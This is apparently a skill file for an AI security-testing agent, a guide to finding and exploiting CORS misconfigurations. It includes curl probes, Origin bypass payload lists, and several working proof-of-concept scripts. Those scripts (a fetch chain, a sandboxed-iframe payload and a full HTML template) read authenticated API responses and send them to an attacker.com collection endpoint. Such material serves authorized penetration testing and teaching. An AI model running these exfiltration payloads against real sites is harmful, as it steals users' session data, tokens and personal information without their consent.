<!-- aegis-local: forked 2026-05-04 from pikpikcu/airecon@9a21453459d87eefb012ea355c79b593d0d3c0cc (MIT-licensed); attribution preserved, see ATTRIBUTION.md -->

---
name: cors
description: CORS misconfiguration testing covering origin reflection, null origin bypass, trusted subdomain abuse, pre-flight bypass, and credential-bearing cross-origin requests
---

# CORS Misconfiguration Testing

CORS misconfigurations are one of the most common bug bounty findings. A misconfigured CORS policy allows attacker-controlled origins to make authenticated cross-origin requests, stealing sensitive data including tokens, credentials, and PII.

---

## Core Concepts

CORS headers that matter for security:

    Access-Control-Allow-Origin: https://trusted.com   # Which origins allowed
    Access-Control-Allow-Credentials: true             # Cookies/auth sent cross-origin
    Access-Control-Allow-Methods: GET, POST, PUT       # Allowed HTTP methods
    Access-Control-Allow-Headers: Authorization, X-Custom   # Allowed request headers
    Access-Control-Expose-Headers: X-Custom-Header     # Headers JS can read

**Exploitable condition:** `ACAO: <attacker>` + `ACAC: true`
→ Attacker can make authenticated request from their origin and read response.

---

## Identifying CORS Policy

    # Send request with custom Origin header — observe ACAO response header:
    curl -s -I <target>/api/user \
      -H "Origin: https://attacker.com" \
      -H "Cookie: session=<your_token>"

    # Check response:
    # Access-Control-Allow-Origin: https://attacker.com  → reflected (VULNERABLE)
    # Access-Control-Allow-Origin: *                     → wildcard (no creds)
    # Access-Control-Allow-Origin: https://target.com    → strict (safe)
    # (missing header)                                   → no CORS config

---

## Vulnerability Patterns

### 1. Origin Reflection

Server blindly reflects any Origin header:

    curl -s <target>/api/profile \
      -H "Origin: https://evil.com" \
      -H "Cookie: <auth>"
    # Response: Access-Control-Allow-Origin: https://evil.com
    #           Access-Control-Allow-Credentials: true

    # Exploit PoC:
    <script>
    fetch('https://<target>/api/profile', {
      credentials: 'include'
    })
    .then(r => r.text())
    .then(d => fetch('https://attacker.com/?data=' + btoa(d)));
    </script>

### 2. Prefix/Suffix Match Bypass

Regex-based origin validation with anchoring bugs:

    # Target trusts: *.target.com
    # Bypass: target.com.attacker.com — passes if regex is /target\.com/
    curl -H "Origin: https://target.com.attacker.com" <target>/api/

    # Trusts: /^https:\/\/target\.com/  (missing end anchor)
    # Bypass: https://target.com.attacker.com
    # Bypass: https://target.com.evil.com

    # Trusts: /target\.com$/  (missing start anchor)
    # Bypass: https://notarget.com

### 3. Null Origin

    # null origin is sent by: sandboxed iframes, local files, data: URIs
    curl -s <target>/api/ -H "Origin: null" -H "Cookie: <auth>"
    # If ACAO: null → exploitable via sandboxed iframe:

    # Exploit:
    <iframe sandbox="allow-scripts allow-top-navigation allow-forms"
      srcdoc="<script>
        fetch('https://<target>/api/user', {credentials: 'include'})
        .then(r=>r.text())
        .then(d=>top.location='https://attacker.com/?='+btoa(d))
      </script>">
    </iframe>

### 4. Subdomain Takeover + CORS

If target trusts `*.target.com` and one subdomain is taken over:

    # 1. Find dangling subdomain: legacy.target.com → CNAME → unclaimed hosting
    # 2. Take over the subdomain (GitHub Pages, Netlify, etc.)
    # 3. Host exploit from legacy.target.com
    # 4. CORS policy trusts *.target.com → steal authenticated data

### 5. HTTP Origin on HTTPS Target

    # Some servers accept http:// origin on https:// target:
    curl -s https://<target>/api/ -H "Origin: http://attacker.com"
    # If ACAO: http://attacker.com + ACAC: true → downgrade attack

### 6. Trusted Third-Party Origin

    # If target trusts a third-party you can inject into:
    Access-Control-Allow-Origin: https://trusted-partner.com
    # → XSS on trusted-partner.com enables CORS exploit chain

---

## Testing All API Endpoints

    # Test multiple CORS-sensitive endpoints:
    for path in /api/user /api/profile /api/account /api/me /api/settings \
                /api/tokens /api/keys /api/admin /v1/user /v2/me; do
      echo "--- $path ---"
      curl -s -I https://<target>$path \
        -H "Origin: https://evil.com" \
        -H "Cookie: <auth>" 2>/dev/null | grep -i "access-control"
    done

---

## Pre-flight Request Testing

For non-simple requests (custom headers, PUT/DELETE), browser sends OPTIONS:

    # Test pre-flight:
    curl -X OPTIONS <target>/api/ \
      -H "Origin: https://evil.com" \
      -H "Access-Control-Request-Method: DELETE" \
      -H "Access-Control-Request-Headers: X-Custom-Header" \
      -v 2>&1 | grep -i "access-control"

    # Check if pre-flight allows dangerous methods:
    # Access-Control-Allow-Methods: GET, POST, PUT, DELETE, PATCH
    # + reflected origin + credentials = can perform any method cross-origin

---

## Impact Assessment

| CORS Config | Credentials? | Exploitable? | Impact |
|-------------|-------------|-------------|--------|
| ACAO: * | No (forbidden with creds) | Partial | Low (no auth) |
| ACAO: * + ACAC: true | N/A (invalid) | No | — |
| ACAO: reflected | Yes | YES | Critical |
| ACAO: null | Yes | YES (sandboxed iframe) | High |
| ACAO: *.domain | Yes | YES (subdomain takeover) | High |
| ACAO: http:// on https | Yes | YES (MITM required) | Medium |

---

## CORS with JWT (No Cookie Auth)

If app uses Bearer tokens instead of cookies:

    # ACAO: * + Bearer token auth = less impactful (attacker needs the token)
    # But: if token is in localStorage and XSS exists → read token + make CORS request

    # ACAO reflected + credentials: false → still useful with XSS to exfiltrate data

---

## Automation

    # Corsy — CORS misconfiguration scanner:
    pip install corsy
    python3 corsy.py -u https://<target>/api/ -H "Cookie: <auth>"
    python3 corsy.py -i urls.txt

    # CORStest:
    git clone https://github.com/RUB-NDS/CORStest
    python3 corstest.py -p -o urls.txt

    # Nuclei CORS templates:
    nuclei -t exposures/cors/ -u <target>
    nuclei -t misconfiguration/cors-misconfig.yaml -u <target>

    # Manual payloads list to try as Origin:
    https://evil.com
    null
    https://<target>.evil.com
    https://evil<target>.com
    http://<target>
    https://<target>%60.evil.com     (backtick bypass)
    https://<target>_.evil.com

---

## PoC Template (Steal API Response)

    <!-- CORS PoC — exfiltrate authenticated API response -->
    <html>
    <body>
    <script>
    var target = 'https://<TARGET>/api/me';
    var exfil = 'https://attacker.com/collect?d=';

    fetch(target, {
      method: 'GET',
      credentials: 'include',   // Send cookies
      headers: {
        'Accept': 'application/json'
      }
    })
    .then(function(response) {
      return response.text();
    })
    .then(function(data) {
      // Exfiltrate the data
      new Image().src = exfil + encodeURIComponent(data);
    })
    .catch(function(err) {
      new Image().src = exfil + 'error:' + encodeURIComponent(err.toString());
    });
    </script>
    </body>
    </html>

---

## Pro Tips

1. Test EVERY API endpoint — CORS is often misconfigured on specific routes, not globally
2. Null origin bypass via sandboxed iframe works even with strict same-origin policies
3. Subdomain takeover + CORS wildcard is a very impactful chain — always enumerate subdomains
4. CORS `*` wildcard is NOT exploitable with credentials — only reflected/specific origins are
5. Test both HTTP and HTTPS origins — some servers accept protocol downgrade
6. Check pre-flight responses — `Access-Control-Allow-Methods: *` is also misconfiguration
7. Always verify CORS works end-to-end in browser before reporting — some server-side checks aren't in headers

## Summary

CORS testing = send `Origin: https://evil.com` to every authenticated API endpoint + check if `Access-Control-Allow-Origin` reflects it + check if `Access-Control-Allow-Credentials: true`. Reflected origin with credentials = critical — you can steal any authenticated response (tokens, PII, account data). Also test `Origin: null` (sandboxed iframe bypass) and `*.domain.com` patterns for subdomain takeover chains.
